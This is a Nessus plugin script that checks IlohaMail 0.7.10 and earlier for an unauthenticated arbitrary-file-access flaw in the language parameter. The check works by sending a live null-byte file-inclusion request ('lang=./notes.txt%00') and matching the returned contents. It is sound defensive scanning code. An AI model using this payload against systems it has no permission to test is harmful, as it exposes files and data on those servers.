#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#

if (description) {
  script_id(14630);
  script_version("$Revision: 1.2 $");

# script_cve_id("CVE-MAP-NOMATCH");
# NOTE: no CVE id assigned (gat, 01/2005)
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"7400");
  }
 
  name["english"] = "IlohaMail Arbitrary File Access via Language Variable";
  script_name(english:name["english"]);
 
  desc["english"] = "
The target is running at least one instance of IlohaMail version
0.7.10 or earlier.  Such versions contain a flaw in the processing of
the language variable that allows an unauthenticated attacker to
retrieve arbitrary files available to the web user. 

Solution : Upgrade to IlohaMail version 0.7.11 or later.
Risk factor : Medium";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for Arbitrary File Access via Language Variable vulnerability in IlohaMail";
  script_summary(english:summary["english"]);
 
  script_category(ACT_GATHER_INFO);
  script_copyright(english:"This script is Copyright (C) 2004-2005 George A. Theall");

  family["english"] = "Remote file access";
  script_family(english:family["english"]);

  script_dependencie("global_settings.nasl", "ilohamail_detect.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

# Specify the file to grab from target, relative to IlohaMail/lang directory.
# ./notes.txt exists in each version I've seen. If you change it to 
# something else, you will also need to change the pattern checked
# against the variable 'contents' below.
file = "./notes.txt";

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
debug_print("searching for IlohaMail Arbitrary File Access via Language Variable vulnerability on port ", port, ".");

# Check each installed instance, stopping if we find a vulnerable version.
installs = get_kb_list(string("www/", port, "/ilohamail"));
if (isnull(installs)) exit(0);
foreach install (installs) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    ver = matches[1];
    dir = matches[2];
    debug_print("checking version ", ver, " under ", dir, ".");

    # Try to exploit the vulnerability.
    #
    # nb: the hole exists because conf/defaults.inc et al. trust 
    #     the language setting when calling include() to read
    #     language settings ('int_lang' in more recent versions,
    #     'lang' in older ones).
    foreach var (make_list('int_lang', 'lang')) {
      url = string(dir, "/index.php?", var, "=", file, "%00");
      debug_print("retrieving ", url, "...");
      req = http_get(item:url, port:port);
      res = http_keepalive_send_recv(port:port, data:req);
      if (res == NULL) exit(0);           # can't connect
      debug_print("res =>>", res, "<<.");

      # nb: if successful, file contents will appear between the closing 
      #     HEAD tag and the opening BODY tag, although note that later
      #     versions put a session key there.
      contents = strstr(res, "</HEAD>");
      if (contents != NULL) {
        contents = contents - strstr(contents, "<BODY>");
        debug_print("contents=>>", contents, "<<.");
        # nb: make sure the pattern match agrees with the file retrieved.
        if (contents =~ "New strings") {
          security_warning(port);
          exit(0);
        }
      }
    }
  }
}
